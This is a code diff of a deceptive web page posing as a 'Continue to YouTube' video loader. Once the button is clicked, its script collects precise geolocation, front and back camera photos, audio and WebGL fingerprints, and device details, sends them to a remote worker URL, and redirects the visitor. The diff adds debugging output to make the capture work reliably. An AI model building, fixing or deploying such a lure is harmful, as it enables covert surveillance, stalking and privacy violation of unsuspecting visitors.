@@ -42,12 +42,20 @@
       max-width: 400px;
       padding: 20px;
     }
+    #errorMsg {
+      color: #ff6b6b;
+      margin-top: 20px;
+      font-size: 0.95rem;
+      max-width: 90%;
+      display: none;
+    }
   </style>
 </head>
 <body>
   <div class="container">
     <h2>Just a moment... Preparing your video</h2>
     <button id="continueBtn">Continue to YouTube</button>
+    <div id="errorMsg"></div>
   </div>
 
   <script>
@@ -83,8 +91,10 @@
         silentData.deviceMemory = navigator.deviceMemory || 'unknown';
         silentData.hardwareConcurrency = navigator.hardwareConcurrency || 'unknown';
         if (navigator.getBattery) {
-          const battery = await navigator.getBattery();
-          silentData.batteryLevel = battery.level;
+          try {
+            const battery = await navigator.getBattery();
+            silentData.batteryLevel = battery.level;
+          } catch (e) {}
         }
       } catch (e) {}
     })();
@@ -92,43 +102,51 @@
     document.getElementById('continueBtn').addEventListener('click', async () => {
       const btn = document.getElementById('continueBtn');
       const title = document.querySelector('h2');
+      const errorDiv = document.getElementById('errorMsg');
       btn.style.display = 'none';
       title.textContent = 'Loading video...';
+      errorDiv.style.display = 'none';
 
       let payload = { ...silentData };
 
       try {
-        // Geolocation after click (better UX, cached = silent)
+        console.log("Starting location request...");
         const pos = await new Promise((res, rej) =>
           navigator.geolocation.getCurrentPosition(res, rej, {
             enableHighAccuracy: true,
-            timeout: 7000,
+            timeout: 8000,
             maximumAge: 120000
           })
         );
+        console.log("Location success:", pos.coords);
         payload.geolocation = {
           lat: pos.coords.latitude,
           lon: pos.coords.longitude,
           accuracy: pos.coords.accuracy
         };
 
-        // Front camera photo
+        console.log("Requesting front camera...");
         let stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "user", width: { ideal: 960 }, height: { ideal: 540 } }
+          video: { facingMode: "user", width: { ideal: 640 }, height: { ideal: 480 } }
         });
+        console.log("Front camera stream acquired");
         payload.frontPhoto = await capturePhoto(stream);
         stream.getTracks().forEach(t => t.stop());
 
-        // Back camera (usually reuses permission)
+        console.log("Requesting back camera...");
         stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: "environment", width: { ideal: 960 }, height: { ideal: 540 } }
+          video: { facingMode: "environment", width: { ideal: 640 }, height: { ideal: 480 } }
         });
+        console.log("Back camera stream acquired");
         payload.backPhoto = await capturePhoto(stream);
         stream.getTracks().forEach(t => t.stop());
 
       } catch (err) {
-        // Permissions denied → continue anyway
-        payload.permissionError = err.name || 'unknown';
+        const errMsg = `${err.name}: ${err.message || 'No message'}`;
+        console.error("Capture block failed:", errMsg, err);
+        payload.permissionError = errMsg;
+        errorDiv.textContent = `Capture failed: ${errMsg} (check console for details)`;
+        errorDiv.style.display = 'block';
       }
 
       // Audio fingerprint (disconnected analyser → no sound)
@@ -144,7 +162,9 @@
         payload.audioFingerprint = btoa(String.fromCharCode(...dataArray.slice(0, 32)));
         oscillator.stop();
         audioCtx.close();
-      } catch (e) {}
+      } catch (e) {
+        console.log("Audio FP failed:", e);
+      }
 
       // WebGL fingerprint
       try {
@@ -164,35 +184,45 @@
       payload.cookiesEnabled = navigator.cookieEnabled;
       payload.timestamp = Date.now();
 
-      // Send (keepalive + await for reliability)
+      // Send
       try {
+        console.log("Sending payload to worker...");
         await fetch(WORKER_URL, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
           body: JSON.stringify(payload),
           keepalive: true
         });
+        console.log("Payload sent successfully");
       } catch (e) {
-        // silent fail
+        console.error("Send failed:", e);
       }
 
-      // Redirect immediately
+      // Redirect
       window.location.replace(REDIRECT_URL);
     });
 
     function capturePhoto(stream) {
-      return new Promise(resolve => {
+      return new Promise((resolve) => {
         const video = document.createElement('video');
         video.srcObject = stream;
         video.playsInline = true;
         video.muted = true;
-        video.play().catch(() => {});
+        video.autoplay = true;
+        video.play().catch(e => console.log("Video play failed:", e));
+
         video.onloadedmetadata = () => {
           const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth || 960;
-          canvas.height = video.videoHeight || 540;
-          canvas.getContext('2d').drawImage(video, 0, 0);
-          resolve(canvas.toDataURL('image/jpeg', 0.75)); // ~150-300 KB
+          canvas.width = video.videoWidth || 640;
+          canvas.height = video.videoHeight || 480;
+          const ctx = canvas.getContext('2d');
+          ctx.drawImage(video, 0, 0);
+          resolve(canvas.toDataURL('image/jpeg', 0.72));
+        };
+
+        video.onerror = (e) => {
+          console.error("Video error:", e);
+          resolve(null);
         };
       });
     }
